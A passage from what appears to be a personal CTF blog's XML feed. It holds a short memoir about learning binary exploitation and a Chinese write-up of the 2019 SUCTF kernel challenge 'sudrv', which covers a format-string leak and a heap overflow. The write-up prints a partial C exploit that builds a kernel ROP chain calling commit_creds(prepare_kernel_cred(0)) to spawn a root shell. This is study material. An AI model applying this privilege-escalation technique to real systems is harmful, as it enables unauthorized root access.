class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> glibc 2.23 </tag>
            
            <tag> GeekPwn 2020 </tag>
            
            <tag> FSOP </tag>
            
            <tag> unsorted bin attack </tag>
            
            <tag> IO attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人感悟及经历</title>
      <link href="/2020/07/29/blog-open-source/"/>
      <url>/2020/07/29/blog-open-source/</url>
      
        <content type="html"><![CDATA[<h1 id="简短介绍"><a href="#简短介绍" class="headerlink" title="简短介绍"></a>简短介绍</h1><p>开篇，写下个人的一些经历和感想</p><hr><h1 id="个人经历"><a href="#个人经历" class="headerlink" title="个人经历"></a>个人经历</h1><p>在2015年报志愿的时候，一个偶然的机遇，在大哥的指引下迈入计算机这个大行业，本身是冲着信安去的，但由于成信的信安和计科分别为两个大院，少有往来，当时想加入有名的成信“三叶草”战队，但投递简历后也是杳无音讯。周围也没有搞安全的伙伴，更重要的是自己也不知道怎么开始，本科四年基本就处在做课程设计、学开发的阶段，很不错的经历是利用开发做了不少有趣的事情。现在明白了安全接触的晚主要还是自己的不够主动导致，不过本科的其他经历也同样让我受益匪浅。</p><p>大三在一个刻意的机会下，大哥建议我去北邮，告诉我那里安全氛围很好可以好好练技术，于是大三那年便向北邮发起了考研冲击。后来成功的进入网安院八组，拜入崔老师门下。也就是大约去年这个时候下定决心一定要好好学二进制，由于神级调试器gdb实在不会用，于是也一直卡卡停停。不过我永远也忘不了一开始nc上去getflag的感觉，现在也体会到一点当时的感觉跟现在能成功getflag的感觉是有质的差距。</p><p>进入北邮后体会了氛围，这里身边的每个人都是那么谦虚，那么乐意讲解和分享。实验室里学长会谦虚的说自己很菜（然而最近知道了去阿里云实习2333…），自己尽量承担科研任务并鼓励你好好学PWN。学姐会耐心的教你搭环境和调漏洞。实验室永远都是欢乐的，永远流传着天枢历届巨佬们的事迹。最开始的时候学pwn也踩了一些坑。去年大约这个时候愚蠢的拿32位ROP的问题去问一个神级PWN师傅，而另一位神级PWN师傅还得面试啥都不懂的我，困难的不是准备问什么，而是有什么比较基础的能问。</p><p>也就是开学大概一两周后，面基了后来带我入门二进制的师傅Ama2in9（他现在的ID有点难记）。从那时候见面那天就开始一直给我讲各种东西，发题给我做（虽然好多都被我鸽了hhh），几乎每天都会找他请教。逐渐的，在他的帮助下我终于推开了二进制的大门。记得在一次问完东西的聊天中，他说以前p4nda和jige也是这样带他的，这个时候我体会到了传承，传承的是知识，更重要的是这种精神。毫无疑问，有个人如果和我探讨某个问题，我也会像Ama2in9师傅那样的毫无保留。</p><p>前两天看到聊天，明年这个时候Ama2in9师傅应该就退了，这个时候应该都去实习了。同样的也提醒了我的ctf职业生涯也快结束了，与大家并肩作战的时间也快结束了，顿时感到了一些压迫感，开始的快结束的更快。只希望在有限的ctf职业生涯里面能够绽放出自己的光芒，可以为天枢战队的荣誉增光添彩，不过这想法也阻止不了咸鱼本尊摸鱼的生活。</p><p>2020.9.7 更新：来到学校又开始天天跟xmzyshypnc师傅交流，xm师傅提出一个研究更有实际意义的东西的想法，最后考虑后决定是学习路由器，决定从现在开始互相鼓励（他带我）学习路由器。</p><h1 id="生涯里程碑"><a href="#生涯里程碑" class="headerlink" title="生涯里程碑"></a>生涯里程碑</h1><p>2019.7月    正式开始学习pwn<br>2019.11.12  成为天枢战队的一员<br>2020.7.23   搭建了自己的个人博客<br>2020.7.29   在安全客上分享了第一篇文章<br>2020.9.7    开始学习路由器</p><!-- <table>  <tr>    <td><img width="100" src="https://sunhwee.com/medias/reward/alipay.bmp" ></td>    <td><img width="100" src="https://sunhwee.com/medias/reward/wechat.bmp" ></td>    <td><img width="100" src="https://sunhwee.com/medias/reward/zan.png" ></td>     </tr></table> --><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 个人感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-SUCTF-kernel-sudrv</title>
      <link href="/2020/07/28/2019-suctf-kernel-sudrv/"/>
      <url>/2020/07/28/2019-suctf-kernel-sudrv/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是2019 SUCTF的kernel题，拿过来回味一下。检测知识点格式化字符串和heap overflow<br><a href="链接：https://pan.baidu.com/s/1PA3a6z1YQDQmQLjirFHnuQ">题目链接</a><br>提取码：wqhv</p><h1 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h1><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/0.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/1.png"></div>开启了地址随机化和smep，canry没有开启。<h1 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h1><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/2.png"></div>kernel有的问题需要从汇编层面看才可以找到漏洞：格式化字符串漏洞：cs:su_buf是我们传入的字符串放入的heap地址，紧接着调用sudrv_ioctl_cold_2函数中的printf函数：printf(heap_addr)那么就是格式化字符串漏洞。<p>heap overflow：对传入的字符串没有检查直接拷贝到heap会造成overflow，那么根据kernel heap管理策略我们可以去覆盖后面chunk的fd为stack，就可以控制stack内存。</p><h1 id="0x03-思路"><a href="#0x03-思路" class="headerlink" title="0x03 思路"></a>0x03 思路</h1><p>格式化字符串用来leak stack地址和kernel地址。stack地址是为了后面heap overflow控制stack中ret内存，kernel地址是为了绕过kalsr。</p><p>后面的heap overflow就可以改fd为stack中的ret地址来控制stack内存，进行rop。绕过smep用户态执行commit_creds(prepare_kernel_cred(0))，用户态直接system(“/bin/sh”)即可。</p><p><strong>这里注意一点：内核中格式化字符串的利用和glibc有区别，要通过%llx打印，%p有错误。</strong></p><h1 id="0x04-调试"><a href="#0x04-调试" class="headerlink" title="0x04 调试"></a>0x04 调试</h1><p>由于之前没有做过kernel heap overflow的题目，为了加强印象，在这里完整的做一个调试过程，看看kernel的heap是个什么样子：</p><h2 id="覆盖fd："><a href="#覆盖fd：" class="headerlink" title="覆盖fd："></a>覆盖fd：</h2><p><strong>1.执行完这句</strong>：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/3.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/4.png"></div>内存：rax是freelist，这次malloc 0x.....2b8000下一个就malloc 0x.....2bc000<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/5.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/6.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/7.png"></div><p><strong>2.执行到printk的时候</strong>：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/8.png"></div>发现0x2b8000内存已经被分配<p><strong>3.进一步测试</strong>：多次分配</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/9.png"></div>第一次执行：<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/10.png"></div>第二次执行：<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/11.png"></div>看看“aaaaaaaa”字符串在哪儿：<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/12.png"></div>通过测试我们明白了，heap overflow通过覆盖freelist的下一个fd来达到任意地址分配。<p>为什么最后需要再写入heap三次：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/13.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/14.png"></div>这是最后修改了fd后想劫持heap地址到stack上时，第一次分配heap的情况：我们看到freelist最后的地址时栈地址，然而需要再分配两次才能分配到stack地址。所以我们在最后需要再分配两次heap。<p><strong>在这里提一下kernel的分配策略，分配的时候通过一个类似fastbin的链来进行分配：</strong></p><p><strong>1.这个链中的heap地址可能连续可能不连续。如果不连续那么我们的改fd就会失败，例如abc是三个连续的chunk地址，但是由于在链中a-&gt;c-&gt;b，那么我们通过a去溢出改的fd是b指向的chunk地址，这样的话就会会成为a-&gt;c-&gt;b-&gt;victim，之前的分配策略肯定就不满足</strong></p><p><strong>2.还有个问题就是，也许第一次分配0x100 chunk的时候是a链来分配，再分配一次的时候就可能是另外一条链，也许是因为其他一些机制或者运行过程中内核消耗了a链的chunk导致的，目前还不太清楚原因。</strong></p><p><strong>3.kernel 的这条链类似fastbin，后入先出，分配的时候检查不了size，原理就得了解kernel堆的管理策略了，在这里就不展开了</strong></p><h1 id="0x05-异常情况"><a href="#0x05-异常情况" class="headerlink" title="0x05 异常情况"></a>0x05 异常情况</h1><p>本来想改cr4来绕过smep的，但是修改完cr4后跳转执行用户态代码会导致直接报错，目前也不太清楚为什么。有大佬成功或者知道原因请指导下俺。</p><p>影响成功率的不只是需要连续地址的chunk，还有一点就是执行后面rop的时候偶尔会导致segment fault。这个题由于这两个原因耗了大半天。</p><p>上张截图纪念一下吧：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/28/2019-suctf-kernel-sudrv/15.png"></div><h1 id="0x06-exp"><a href="#0x06-exp" class="headerlink" title="0x06 exp"></a>0x06 exp</h1><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ipc.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;memory.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;pty.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>uint64_t commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff81081410</span><span class="token punctuation">;</span>uint64_t prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0xffffffff81081790</span><span class="token punctuation">;</span>uint64_t pop_rsi_ret <span class="token operator">=</span> <span class="token number">0xffffffff81001fbd</span><span class="token punctuation">;</span>uint64_t mov_cr4_rdi_pop_rbp_ret <span class="token operator">=</span> <span class="token number">0xffffffff81020300</span><span class="token punctuation">;</span>uint64_t mov_cr4_rax_ret <span class="token operator">=</span> <span class="token number">0xffffffff81038dc6</span><span class="token punctuation">;</span>uint64_t pop_rdx_ret <span class="token operator">=</span> <span class="token number">0xffffffff810aebb2</span><span class="token punctuation">;</span>uint64_t call_rdx <span class="token operator">=</span> <span class="token number">0xffffffff821de6b9</span><span class="token punctuation">;</span>uint64_t pop_rax_ret <span class="token operator">=</span> <span class="token number">0xffffffff8101ac0c</span><span class="token punctuation">;</span>uint64_t mov_rdi_rax_call_rdx <span class="token operator">=</span> <span class="token number">0xffffffff810aa626</span><span class="token punctuation">;</span>uint64_t swapgs_pop_rbp_ret <span class="token operator">=</span> <span class="token number">0xffffffff81070834</span><span class="token punctuation">;</span>uint64_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_eflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>uint64_t <span class="token function">u64</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>    uint64_t result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">7</span> <span class="token punctuation">;</span> i <span class="token operator">>=</span><span class="token number">0</span> <span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">0x00000000000000ff</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span>        <span class="token string">"movq %%cs, %0\n"</span>        <span class="token string">"movq %%ss, %1\n"</span>        <span class="token string">"movq %%rsp, %3\n"</span>        <span class="token string">"pushfq\n"</span>        <span class="token string">"popq %2\n"</span>        <span class="token punctuation">:</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_eflags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span>         <span class="token punctuation">:</span>         <span class="token punctuation">:</span> <span class="token string">"memory"</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">launch_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x73311337</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] create success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x13377331</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] delete success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] show success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">,</span>launch_shell<span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t kernel_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>    uint64_t stack <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    uint64_t kernel <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> overflow<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    uint64_t offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    uint64_t static_kernel_addr <span class="token operator">=</span> <span class="token number">0xffffffff811c827f</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>overflow<span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/meizijiutql"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">create</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token string">"%llx %llx %llx %llx %llx kernel:0x%llx %llx %llx %llx stack:0x%llx %llx %llx %llx %llx %llx\n"</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// getchar();</span>    <span class="token function">show</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">show</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input stack and kernel address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">show</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lx %lx"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>stack<span class="token punctuation">,</span><span class="token operator">&amp;</span>kernel<span class="token punctuation">)</span><span class="token punctuation">;</span>    stack <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x88</span><span class="token punctuation">;</span>    offset <span class="token operator">=</span> kernel <span class="token operator">-</span> static_kernel_addr<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// *((size_t *)overflow+0xf0/8) = 0x800000;</span>    <span class="token comment" spellcheck="true">// *((size_t *)overflow+0xf8/8) = 0xffffffffffffffff;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> stack<span class="token punctuation">;</span>    <span class="token function">create</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>overflow<span class="token punctuation">,</span><span class="token number">0x110</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">create</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">create</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span> offset<span class="token operator">+</span><span class="token number">0xffffffff81001388</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// pop rdi;ret;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> offset<span class="token operator">+</span>prepare_kernel_cred<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// prepare_kernel_cred</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x18</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xffffffff819e2959</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// mov rdi rax; mov qword ptr [rdi],1;ret</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> offset<span class="token operator">+</span>commit_creds<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// commit_creds</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x28</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xffffffff81001388</span><span class="token operator">+</span>offset<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// pop rdi ret</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x6f0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x38</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xffffffff8104e5b1</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mov cr4 rdi;push rdx; popfq ret close smep(useless)</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x40</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xffffffff810674ff</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// pop rcx. set rcx = 0</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x48</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xffffffff81a000e1</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// pop r15; pop r14; pop r13; pop r12; pop rbp; pop rbx; pop rsi; pop r10; pop r9;pop r8; pop rax; pop rsi;pop rdx;pop rsi swapgs;sysret</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x58</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r15</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x60</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r14</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x68</span><span class="token operator">/</span><span class="token number">8</span><span class="token 